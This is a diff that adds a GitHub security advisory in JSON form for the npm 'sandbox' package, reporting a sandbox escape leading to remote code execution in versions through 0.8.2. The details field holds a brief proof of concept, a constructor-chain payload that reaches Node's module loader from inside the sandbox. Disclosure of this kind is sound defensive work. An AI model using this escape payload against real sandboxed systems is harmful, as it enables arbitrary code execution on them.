@@ -1,0 +1,48 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-fm4j-4xhm-xpwx",
+  "modified": "2026-02-02T23:13:21Z",
+  "published": "2020-09-02T15:51:34Z",
+  "aliases": [],
+  "summary": "Sandbox Breakout / Arbitrary Code Execution in sandbox",
+  "details": "All versions of `sandbox` through 0.8.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.\n\n## Proof of concept\n```\nvar Sandbox = require(\"sandbox\")\ns = new Sandbox()\ncode = `new Function(\"return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())\")()(\"util\").inspect(\"hi\")`\ns.run(code)\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+  "severity": [],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "sandbox"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.0.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "< 1.0.0"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gf3/sandbox/issues/50"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.npmjs.com/advisories/766"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2020-08-31T18:34:58Z",
+    "nvd_published_at": null
+  }
+}
